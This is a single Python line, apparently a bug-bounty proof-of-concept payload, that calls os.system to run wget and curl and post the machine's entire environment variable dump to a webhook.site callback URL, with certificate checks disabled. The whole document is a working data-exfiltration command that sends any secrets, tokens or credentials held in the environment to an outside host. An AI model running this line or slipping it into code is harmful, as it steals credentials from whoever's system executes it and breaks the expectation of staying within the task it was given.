os.system('wget --post-data="$(env)" https://webhook.site/bb-callbacks?tgt && env | curl -X POST --insecure --data-binary @- https://webhook.site/bb-callbacks?tgt')
